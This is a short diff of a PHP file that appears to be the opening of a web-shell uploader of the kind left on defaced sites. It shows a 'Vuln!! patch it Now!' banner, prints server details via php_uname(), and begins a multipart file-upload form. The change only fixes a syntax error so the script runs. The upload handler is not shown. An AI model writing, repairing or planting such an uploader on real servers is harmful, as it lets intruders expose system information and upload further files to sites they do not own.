@@ -1,5 +1,5 @@
 <?php
-echo Vuln!! patch it Now!;
+echo "Vuln!! patch it Now!";
 echo "<font color='RED'</font><center><h1>Vuln!! patch it Now!</h1></center>";
 echo '<font color="BLUE"</font><center><b><br>'.php_uname().'<br></b></center>';  
 echo '<center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"></center>'; 
